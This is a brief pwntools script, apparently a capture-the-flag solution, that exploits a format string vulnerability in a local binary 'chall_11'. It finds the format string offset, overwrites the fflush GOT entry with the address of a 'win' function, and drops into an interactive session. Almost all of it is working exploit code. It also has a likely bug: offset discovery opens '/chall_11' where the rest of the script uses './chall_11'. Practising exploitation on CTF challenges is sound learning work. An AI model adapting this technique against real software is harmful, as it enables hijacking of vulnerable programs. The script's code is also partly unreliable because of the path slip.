# overwrite the GOT entry, format string vulnerbility 

from pwn import * 

p = process('./chall_11')
binary = ELF('./chall_11')
context.arch = 'amd64'

# change the fflush to win in the GOT
# pass in a function to get offset

def getOffset(payload): 
	p = process('/chall_11')
	p.sendline()
	p.sendline(payload)
	return p.recvall()

p = process('./chall_11')
binary = ELF('./chall_11')
offset = FmtStr(getOffset)
#payload = fmtstr_payload(offset, {binary.got.fflush:binary.sym.win})

p.sendline()
p.send(fmtstr_payload(offset.offset, {binary.got.fflush:binary.sym.win}))
p.interactive()